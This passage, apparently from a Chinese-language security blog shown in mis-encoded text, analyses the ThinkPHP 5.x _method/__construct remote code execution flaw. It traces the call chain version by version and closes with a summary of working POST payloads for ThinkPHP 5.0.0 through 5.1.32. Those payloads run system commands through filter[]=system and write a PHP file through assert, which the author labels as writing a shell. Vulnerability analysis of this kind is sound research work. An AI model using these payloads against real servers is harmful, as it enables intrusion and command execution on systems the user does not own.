alt="image-20240802153133966" /></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$val</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¾“å…¥çš„å‚æ•°è¿˜è¦æ»¡è¶³å¦‚ä¸‹é€»è¾‘ï¼Œæ‰ä¸ä¼šreturnï¼Œè¿™é‡Œçš„dataæ˜¯æˆ‘ä»¬èµ‹å€¼çš„serverå˜é‡ï¼Œè§£å†³åŠæ³•ä¹Ÿå¾ˆç®€å•ï¼Œæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªè¾“å…¥ï¼Œæ»¡è¶³å­˜åœ¨$valé”®å€¼å³å¯ã€‚</p><p>ä¹Ÿå°±æ˜¯server[REQUEST_METHOD]=12312</p><p>å®Œæˆåˆ©ç”¨</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240802154035302.png" alt="image-20240802154035302" /></p><h3 id="22ä¸å¼€å¯debugæƒ…å†µä¸‹çš„åˆ©ç”¨é“¾"><a class="markdownIt-Anchor" href="#22ä¸å¼€å¯debugæƒ…å†µä¸‹çš„åˆ©ç”¨é“¾"></a> 2.2ä¸å¼€å¯Debugæƒ…å†µä¸‹çš„åˆ©ç”¨é“¾</h3><p>ä¸Šé¢ä¹Ÿç®€å•æåˆ°è¿‡ï¼Œæ—¢ç„¶æ²¡æœ‰å¼€å¯debugï¼Œæˆ‘ä»¬å°±è¦å¯»æ‰¾å…¶ä»–çš„æ¼æ´è§¦å‘ç‚¹</p><ol><li>åœ¨Appç±»çš„æ–¹æ³•å¯»æ‰¾ï¼Œ å‘ç°å…¶ä¸­æœ‰è°ƒç”¨paramæ–¹æ³•çš„ä½ç½®ã€‚</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813155235697.png" alt="image-20240813155235697" /></p><ol start="2"><li>åå‘å¾€å›è·Ÿï¼Œè·ŸinvokeMethodæ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813155441971.png" alt="image-20240813155441971" /></p><ol start="3"><li>åå‘è·Ÿmoduleæ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813155810783.png" alt="image-20240813155810783" /></p><ol start="4"><li>æ‰¾åˆ°execæ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813155907274.png" alt="image-20240813155907274" /></p><ol start="5"><li>æœ€ç»ˆæ‰¾åˆ°è§¦å‘ç‚¹ï¼Œå®é™…ä¸Šå°±åœ¨æˆ‘ä»¬ä¸Šé¢åˆ†æçš„debugä¸‹é¢çš„ä½ç½®</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813155948369.png" alt="image-20240813155948369" /></p><ol start="6"><li>æ‰¾åˆ°å®Œæ•´è§¦å‘é“¾ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾callbackçš„å‡½æ•°çš„å‚æ•°ï¼Œå°½é‡åšåˆ°å¯æ§</li></ol><p>$filterå˜é‡å’Œä¸Šé¢debugé‚£æ¡ç›¸åŒï¼Œæ˜¯è·å–çš„thiså±æ€§ï¼Œå¯ä»¥ä½¿ç”¨constructæ–¹å¼å¯¹filterå±æ€§èµ‹å€¼ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813160850291.png" alt="image-20240813160850291" /></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mi mathvariant="normal">å˜</mi><mi mathvariant="normal">é‡</mi><mi mathvariant="normal">èµ‹</mi><mi mathvariant="normal">å€¼</mi><mi mathvariant="normal">åœ¨</mi><mi mathvariant="normal">æ­¤</mi><mi mathvariant="normal">ï¼Œ</mi><mi mathvariant="normal">æ˜¯</mi><mi mathvariant="normal">æ•°</mi><mi mathvariant="normal">ç»„</mi><mi mathvariant="normal">åˆ</mi><mi mathvariant="normal">å¹¶</mi><mi mathvariant="normal">çš„</mi><mi mathvariant="normal">ã€‚</mi><mi mathvariant="normal">çœ‹</mi><mi mathvariant="normal">ä¸­</mi><mi mathvariant="normal">é—´</mi><mi mathvariant="normal">çš„</mi></mrow><annotation encoding="application/x-tex">dataå˜é‡èµ‹å€¼åœ¨æ­¤ï¼Œæ˜¯æ•°ç»„åˆå¹¶çš„ã€‚çœ‹ä¸­é—´çš„</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord cjk_fallback">å˜</span><span class="mord cjk_fallback">é‡</span><span class="mord cjk_fallback">èµ‹</span><span class="mord cjk_fallback">å€¼</span><span class="mord cjk_fallback">åœ¨</span><span class="mord cjk_fallback">æ­¤</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">æ˜¯</span><span class="mord cjk_fallback">æ•°</span><span class="mord cjk_fallback">ç»„</span><span class="mord cjk_fallback">åˆ</span><span class="mord cjk_fallback">å¹¶</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">ã€‚</span><span class="mord cjk_fallback">çœ‹</span><span class="mord cjk_fallback">ä¸­</span><span class="mord cjk_fallback">é—´</span><span class="mord cjk_fallback">çš„</span></span></span></span>varsï¼Œèµ‹å€¼åœ¨ä¸Šé¢ï¼Œå…¶å®è·å–çš„æ˜¯æ‰€æœ‰çš„postå‚æ•°</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813163516793.png" alt="image-20240813163516793" /></p><p>æœ€ç»ˆcallbacké€’å½’è°ƒç”¨filterValueï¼Œ$dataæ•°æ®é”®å€¼æ˜¯æˆ‘ä»¬postçš„data</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813165432649.png" alt="image-20240813165432649" /></p><p>æœ€ç»ˆä¹Ÿä¼šä½¿ç”¨callbackè°ƒç”¨æˆ‘ä»¬ä¼ çš„å‚æ•°ï¼Œå®Œæˆæ•´æ¡é“¾çš„è°ƒç”¨</p><pre class="line-numbers language-none"><code class="language-none">aaaaa&#x3D;calc&amp;_method&#x3D;__construct&amp;filter[]&#x3D;system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813165645059.png" alt="image-20240813165645059" /></p><p><strong>æˆ‘ä»¬ä½¿ç”¨ç½‘ä¸Šçš„payloadåšè°ƒè¯•çš„æ—¶å€™ï¼Œä½¿ç”¨calcå¯èƒ½å‘ç°å¼¹å‡ºæ¥å¾ˆå¤šä¸ªè®¡ç®—å™¨ï¼ŒåŸå› å…¶å®ä¹Ÿåœ¨æˆ‘ä»¬ä¸Šé¢çš„åˆ†æè¿‡ç¨‹ï¼š</strong></p><p>paramæ˜¯ä¸‰ä¸ªå‚æ•°è·å–æ‹¼æ¥çš„ï¼Œæˆ‘ä»¬callbackè°ƒç”¨æ˜¯å¾ªç¯è°ƒç”¨ï¼Œfilterå’Œå‚æ•°éƒ½æ˜¯ç¬›å¡å°”ç§¯æ‰§è¡Œçš„ï¼Œæœ€ç»ˆæ‰§è¡Œçš„æ—¶å€™ä¹Ÿå°±æ‰§è¡Œäº†calcã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813170430023.png" alt="image-20240813170430023" /></p><h2 id="3-ä¸åŒç‰ˆæœ¬çš„payloadåŒºåˆ«åˆ†æ"><a class="markdownIt-Anchor" href="#3-ä¸åŒç‰ˆæœ¬çš„payloadåŒºåˆ«åˆ†æ"></a> 3. ä¸åŒç‰ˆæœ¬çš„PayloadåŒºåˆ«åˆ†æ</h2><h4 id="tp-500version507"><a class="markdownIt-Anchor" href="#tp-500version507"></a> TP 5.0.0&lt;=version&lt;=5.0.7</h4><p>æˆ‘ä»¬ä¸Šé¢è°ƒè¯•çš„payloadæ˜¯5.0.12ç‰ˆæœ¬çš„ï¼Œä½¿ç”¨çš„payloadæ˜¯<code>aaaaa=calc&amp;_method=__construct&amp;filter[]=system</code></p><p>åœ¨5.0.7ä½¿ç”¨ä¸Šé¢åˆ†æçš„payloadï¼Œå¼€å¯debugåˆ†æä¸€ä¸‹ï¼Œå‘ç°ä¼šæŠ¥é”™ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815105135342.png" alt="image-20240815105135342" /></p><p>å¯¹æ¯”ä¸€ä¸‹tp5.0.7çš„ä»£ç ï¼Œå‘ç°<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>u</mi><mi>l</mi><mi>e</mi><mi>s</mi><mi mathvariant="normal">è¿™</mi><mi mathvariant="normal">é‡Œ</mi><mi mathvariant="normal">ï¼Œ</mi><mi mathvariant="normal">åœ¨</mi><mi mathvariant="normal">é«˜</mi><mi mathvariant="normal">ç‰ˆ</mi><mi mathvariant="normal">æœ¬</mi><mi mathvariant="normal">åš</mi><mi mathvariant="normal">äº†</mi><mi mathvariant="normal">åˆ¤</mi><mi mathvariant="normal">æ–­</mi><mi mathvariant="normal">å¤„</mi><mi mathvariant="normal">ç†</mi><mi mathvariant="normal">ï¼Œ</mi><mi mathvariant="normal">ä½</mi><mi mathvariant="normal">ç‰ˆ</mi><mi mathvariant="normal">æœ¬</mi><mi mathvariant="normal">æ²¡</mi><mi mathvariant="normal">æœ‰</mi><mi mathvariant="normal">å€¼</mi><mi mathvariant="normal">ä¼š</mi><mi mathvariant="normal">æ•°</mi><mi mathvariant="normal">ç»„</mi><mi mathvariant="normal">è¶Š</mi><mi mathvariant="normal">ç•Œ</mi><mi mathvariant="normal">ï¼Œ</mi><mi mathvariant="normal">åˆ†</mi><mi mathvariant="normal">æ</mi><mi mathvariant="normal">ä¸€</mi><mi mathvariant="normal">ä¸‹</mi><mi mathvariant="normal">è·</mi><mi mathvariant="normal">å–</mi></mrow><annotation encoding="application/x-tex">rulesè¿™é‡Œï¼Œåœ¨é«˜ç‰ˆæœ¬åšäº†åˆ¤æ–­å¤„ç†ï¼Œä½ç‰ˆæœ¬æ²¡æœ‰å€¼ä¼šæ•°ç»„è¶Šç•Œï¼Œåˆ†æä¸€ä¸‹è·å–</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">è¿™</span><span class="mord cjk_fallback">é‡Œ</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">åœ¨</span><span class="mord cjk_fallback">é«˜</span><span class="mord cjk_fallback">ç‰ˆ</span><span class="mord cjk_fallback">æœ¬</span><span class="mord cjk_fallback">åš</span><span class="mord cjk_fallback">äº†</span><span class="mord cjk_fallback">åˆ¤</span><span class="mord cjk_fallback">æ–­</span><span class="mord cjk_fallback">å¤„</span><span class="mord cjk_fallback">ç†</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">ä½</span><span class="mord cjk_fallback">ç‰ˆ</span><span class="mord cjk_fallback">æœ¬</span><span class="mord cjk_fallback">æ²¡</span><span class="mord cjk_fallback">æœ‰</span><span class="mord cjk_fallback">å€¼</span><span class="mord cjk_fallback">ä¼š</span><span class="mord cjk_fallback">æ•°</span><span class="mord cjk_fallback">ç»„</span><span class="mord cjk_fallback">è¶Š</span><span class="mord cjk_fallback">ç•Œ</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">åˆ†</span><span class="mord cjk_fallback">æ</span><span class="mord cjk_fallback">ä¸€</span><span class="mord cjk_fallback">ä¸‹</span><span class="mord cjk_fallback">è·</span><span class="mord cjk_fallback">å–</span></span></span></span>methodå€¼çš„éƒ¨åˆ†</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813182615250.png" alt="image-20240813182615250" /></p><p>è·Ÿè¿›å»ï¼Œè¿™é‡Œçš„æ–¹æ³•åœ¨æˆ‘ä»¬ä¸Šé¢å·²ç»åˆ†æè¿‡äº†ï¼Œæ˜¯æ¼æ´çš„è§¦å‘ç‚¹ï¼Œä¼šèµ°åˆ°ç¬¬ä¸€ä¸ªæ¡†å†…çš„é€»è¾‘ï¼Œç„¶åä¼ å…¥constructå¯¹Requestç±»çš„å±æ€§è¿›è¡Œè¦†ç›–ã€‚æˆ‘ä»¬çœ‹ä¸€ä¸‹å‡½æ•°çš„è¿”å›å€¼ï¼Œå‘ç°è¿”å›çš„this-&gt;methodï¼Œæˆ‘ä»¬ä¸Šé¢å·²ç»å¯ä»¥è¿›è¡Œè¦†ç›–äº†ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥é€‰æ‹©åœ¨post bodyä¸­è¦†ç›–methodï¼Œè¿™æ ·å°±ä¸ä¼šæ•°ç»„è¶Šç•Œäº†ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815110124941.png" alt="image-20240815110124941" /></p><p>rulesæ•°ç»„å­˜åœ¨å¦‚ä¸‹keyå€¼ï¼Œä¿è¯ä¸è¶Šç•Œå³å¯ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815111159943.png" alt="image-20240815111159943" /></p><p>å› æ­¤éšä¾¿é€‰æ‹©ä¸€ä¸ªå€¼èµ‹å€¼å³å¯ã€‚</p><p>æœ€ç»ˆpayload:</p><p><strong>aaaaa</strong>=<strong>calc</strong>&amp;<strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>system</strong>&amp;<strong>method</strong>=<strong>name</strong></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815111449636.png" alt="image-20240815111449636" /></p><h4 id="tp-508version5012"><a class="markdownIt-Anchor" href="#tp-508version5012"></a> TP 5.0.8&lt;=version&lt;=5.0.12</h4><p>è¿™ä¸ªæˆ‘ä»¬æœ€åˆçš„ä¾‹å­å°±æ˜¯5.0.12çš„ï¼Œå› æ­¤ä¸è¿‡å¤šèµ˜è¿°ã€‚</p><h4 id="tp-5013version-5116"><a class="markdownIt-Anchor" href="#tp-5013version-5116"></a> TP 5.0.13&lt;=version&lt;= 5.1.16</h4><p>æ­èµ·æ¥5.0.14çš„ç¯å¢ƒï¼Œä½¿ç”¨5.0.12çš„payloadï¼Œdebugçœ‹ä¸€ä¸‹è¿‡ç¨‹</p><p>å‘ç°æœ€ç»ˆè§¦å‘ç‚¹çš„$filteræ²¡æœ‰èµ‹å€¼åˆ°ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815143328858.png" alt="image-20240815143328858" /></p><p>çœ‹ä¸€ä¸‹5.0.13å’Œ5.0.5çš„diff</p><p><a href="https://github.com/top-think/framework/compare/v5.0.5...v5.0.13#diff-d86cf2606459bf4da21b7c3a1f7191f3">https://github.com/top-think/framework/compare/v5.0.5...v5.0.13#diff-d86cf2606459bf4da21b7c3a1f7191f3</a></p><p>åœ¨ä¸Šé¢çš„æ¼æ´åˆ†ææµç¨‹ä¸­ï¼Œæ‰¾åˆ°å¯èƒ½æ›´æ–°äº†filterçš„åœ°æ–¹ã€‚å¦‚ä¸‹å›¾ï¼Œæ›´æ–°äº†filterã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815142514799.png" alt="image-20240815142514799" /></p><p>åœ¨å¯¹åº”ä½ç½®æ‰“ä¸ªæ–­ç‚¹ï¼Œæ­¤æ—¶æˆ‘ä»¬ä¼ å…¥çš„filterå·²ç»è¦†ç›–ä¸ºRequestç±»çš„filterå±æ€§</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815145706757.png" alt="image-20240815145706757" /></p><p>è¿™ä¸ªæ–¹æ³•è·Ÿå…¥å°±æ˜¯è¦†ç›–filterçš„æ–¹æ³•ã€‚è€Œå‚æ•°$config[â€˜default_filterâ€™]ä¸ºç©ºï¼Œä¹Ÿå°±å°†æˆ‘ä»¬ä¼ å…¥çš„systemè¦†ç›–ä¸ºç©ºäº†ï¼Œä¹Ÿå°±å¯¼è‡´æ— æ³•æ‰§è¡Œ5.0.12ç‰ˆæœ¬çš„payloadã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815145848660.png" alt="image-20240815145848660" /></p><p>é‚£ä¹ˆæƒ³åŠæ³•è®©é€»è¾‘ä¸è¿›å…¥å›¾ä¸­çš„æ–¹æ³•ï¼Œå¯»æ‰¾å…¶ä»–è§¦å‘ç‚¹ï¼š</p><ol><li>æˆ‘ä»¬ä¸Šé¢åˆ†æè¿‡ï¼Œå½“å¼€å¯debugæ—¶ï¼Œå¯ä»¥èµ°å¦ä¸€å¥—è§¦å‘é€»è¾‘ã€‚</li><li>å¯»æ‰¾å…¶ä»–è§¦å‘ä½ç½®ï¼Œä¸”è§¦å‘ä½ç½®ä¸èƒ½åœ¨ä¸Šé¢çš„moduleæ–¹æ³•åé¢ï¼Œå¿…é¡»åœ¨å‰é¢</li></ol><p>æˆ‘ä»¬å¯»æ‰¾ä¸€ä¸‹ä¸Šé¢çš„moduleæ–¹æ³•ã€‚æ˜¯ä¸€å¥—switché€»è¾‘ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹èƒ½å¦èµ°å…¥controllerå’Œmethodé€»è¾‘</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815150437594.png" alt="image-20240815150437594" /></p><p>å›¾ä¸­çš„æ˜¯ThinkPHPä¸åŒçš„è·¯ç”±æ–¹å¼ï¼Œå…·ä½“å¦‚ä¸‹ï¼š<a href="https://www.kancloud.cn/manual/thinkphp5/118037">https://www.kancloud.cn/manual/thinkphp5/118037</a></p><p>æˆ‘ä»¬è¦è¿›å…¥çš„æ˜¯æ–¹æ³•3å’Œæ–¹æ³•4ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾TPä»£ç åœ¨å®šä¹‰è·¯ç”±æ—¶ï¼Œæ˜¯å¦æœ‰å¯¹åº”çš„å®šä¹‰æ–¹å¼ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815171134142.png" alt="image-20240815171134142" /></p><p>çœ‹ä¸€ä¸‹<strong>TPå®Œæ•´ç‰ˆ</strong>çš„composeré…ç½®ï¼Œå‘ç°ä¼šè‡ªåŠ¨å®‰è£…å¾ˆå¤šæ¨¡å—ã€‚(ä¸ºäº†æ¼æ´å¤ç°çš„è¯ï¼Œä¹Ÿå¯ä»¥ç›´æ¥é…ç½®&quot;topthink/think-captcha&quot;: â€œ^1.0â€)</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815112918572.png" alt="image-20240815112918572" /></p><p>TPåœ¨åˆå§‹åŒ–æ—¶ï¼Œå­˜åœ¨è‡ªåŠ¨ç±»åŠ è½½æœºåˆ¶ï¼Œå°† <strong>vendor</strong> ç›®å½•ä¸‹çš„æ–‡ä»¶åŠ è½½ï¼Œå› æ­¤ä¼šå­˜åœ¨captchaè·¯ç”±ã€‚ï¼ˆå®Œæ•´ç‰ˆä¼šé»˜è®¤å­˜åœ¨æ­¤è·¯ç”±ï¼‰</p><p>ä¸‹å›¾ä¸­æˆ‘ä»¬å‘ç°æ³¨å†Œäº†ä¸€ä¸ªgetçš„ã€è·¯ç”±åˆ°ç±»çš„æ–¹æ³•ï¼Œç¬¦åˆæˆ‘ä»¬çš„æ¼æ´è§¦å‘ç‚¹ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240807174519099.png" alt="image-20240807174519099" /></p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;?s&#x3D;&#x2F;captcha&amp;XDEBUG_SESSION_START&#x3D;18306 HTTP&#x2F;1.1Host: tp5014Content-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;83.0.4103.116 Safari&#x2F;537.36aaaaa&#x3D;calc&amp;_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬æ‹¿ä¸Šé¢åˆ†æå¥½payloadåŠ ä¸Šcaptchaè·¯ç”±æµ‹è¯•ä¸€ä¸‹ï¼Œæµ‹è¯•åå‘ç°æ²¡æœ‰æˆåŠŸï¼Œæˆ‘ä»¬å›åˆ°å®šä¹‰è·¯ç”±çš„åœ°æ–¹å‘ç°è·¯ç”±å®šä¹‰çš„æ˜¯getæ–¹å¼ï¼Œå› æ­¤æ— æ³•æ‰¾åˆ°æœ€ç»ˆçš„å®šä¹‰è§„åˆ™å¾ˆæ­£å¸¸ã€‚æˆ‘ä»¬è·Ÿå›ä»£ç ã€‚</p><p>è¿™é‡Œçš„ruleæ•°æ®åŒ…å«ç€è·¯ç”±è§„åˆ™ï¼Œgetå­˜å‚¨ç€æˆ‘ä»¬æƒ³åˆ©ç”¨çš„captchaè·¯ç”±ï¼Œè¿™é‡Œä¸ä¸Šé¢çš„æ€è·¯ç±»ä¼¼ï¼Œ$methodæ˜¯å¯æ§çš„ï¼Œå› æ­¤æŠŠä»–ä¿®æ”¹ä¸ºgetå°±å¯ä»¥äº†</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815172003658.png" alt="image-20240815172003658" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815172143487.png" alt="image-20240815172143487" /></p><h4 id="tp-5117-version-5132"><a class="markdownIt-Anchor" href="#tp-5117-version-5132"></a> TP 5.1.17&lt;= version &lt;= 5.1.32</h4><p>é«˜ç‰ˆæœ¬çš„ä»£ç æœ‰å˜åŒ–ï¼Œ ä½ç‰ˆæœ¬å¯ä»¥ä½¿ç”¨constructè°ƒç”¨æ–¹æ³•ï¼Œé«˜ç‰ˆæœ¬ç›´æ¥æ”¹æˆèµ‹å€¼äº†ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æ— æ³•å¯¹Requestç±»çš„ä»»æ„å±æ€§è¿›è¡Œè¦†ç›–äº†ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815173008272.png" alt="image-20240815173008272" /></p><p>å¼€ä¸€ä¸‹debugï¼Œå‘ç°æç¤ºæ— é”®å€¼ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815175017161.png" alt="image-20240815175017161" /></p><p>æ‰¾åˆ°è§¦å‘ä½ç½®ï¼Œè¿™é‡Œä¸ä¸Šé¢è°ƒè¯•é‡è§çš„é—®é¢˜ç±»ä¼¼ï¼Œä¸è¿‡è¿™é‡Œæ— æ³•è¿›è¡Œè¦†ç›–äº†ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815174828864.png" alt="image-20240815174828864" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815174841800.png" alt="image-20240815174841800" /></p><h5 id="ç†è®ºä¸­çš„åˆ©ç”¨æ–¹æ³•"><a class="markdownIt-Anchor" href="#ç†è®ºä¸­çš„åˆ©ç”¨æ–¹æ³•"></a> ç†è®ºä¸­çš„åˆ©ç”¨æ–¹æ³•</h5><p><a href="https://www.cnblogs.com/iamstudy/articles/thinkphp_5_x_rce_1.html">https://www.cnblogs.com/iamstudy/articles/thinkphp_5_x_rce_1.html</a></p><p>è¿™ç¯‡æ–‡ç« æå‡ºäº†ä¸€ä¸ªç†è®ºæ–¹æ³•ï¼Œä½†æ˜¯æœ¬åœ°æœªå¤ç°å‡ºï¼Œå®æˆ˜æ„ä¹‰ä¹Ÿæœ‰é™ï¼Œä»…å½“æ‹“å±•ã€‚</p><h2 id="4payloadæ±‡æ€»-2"><a class="markdownIt-Anchor" href="#4payloadæ±‡æ€»-2"></a> 4.Payloadæ±‡æ€»</h2><h3 id="tp-500v507"><a class="markdownIt-Anchor" href="#tp-500v507"></a> TP 5.0.0&lt;=V&lt;=5.0.7</h3><pre class="line-numbers language-none"><code class="language-none">POST ?s&#x3D;index&#x2F;indexs&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;systemaaaa&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system&amp;get[]&#x3D;whoami<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">POSTs&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert&#x2F;&#x2F;å†™shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="tp-508v5012"><a class="markdownIt-Anchor" href="#tp-508v5012"></a> TP 5.0.8&lt;=V&lt;=5.0.12</h3><pre class="line-numbers language-none"><code class="language-none">POST ?s&#x3D;index&#x2F;indexs&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;systemaaaa&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system&amp;get[]&#x3D;whoamic&#x3D;system&amp;f&#x3D;calc&amp;_method&#x3D;filter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-POST" data-language="POST"><code class="language-POST">POSTs&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert&#x2F;&#x2F;å†™shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="tp-5013v-5116"><a class="markdownIt-Anchor" href="#tp-5013v-5116"></a> TP 5.0.13&lt;=V&lt;= 5.1.16</h3><p>éœ€è¦å¼€å¯debugï¼š</p><pre class="line-numbers language-none"><code class="language-none">POST ?s&#x3D;index&#x2F;indexs&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;systemaaaa&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system&amp;get[]&#x3D;whoamic&#x3D;system&amp;f&#x3D;calc&amp;_method&#x3D;filter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">POSTs&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert&#x2F;&#x2F; å†™shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å®Œæ•´ç‰ˆå­˜åœ¨captchaè·¯ç”±çš„æƒ…å†µï¼š</p><pre class="line-numbers language-none"><code class="language-none">POST ?s&#x3D;captchaaaaa&#x3D;calc&amp;_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="tp-5117-v-5132"><a class="markdownIt-Anchor" href="#tp-5117-v-5132"></a> TP 5.1.17&lt;= V&lt;= 5.1.32</h3><p>ç†è®ºçš„åˆ©ç”¨æ–¹æ³•ï¼šï¼ˆæœªéªŒè¯è¿‡ï¼‰</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;c&#x3D;exec&amp;f&#x3D;calc.exe&amp;_method&#x3D;filter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="å‚è€ƒé“¾æ¥"><a class="markdownIt-Anchor" href="#å‚è€ƒé“¾æ¥"></a> å‚è€ƒé“¾æ¥</h1><p><a 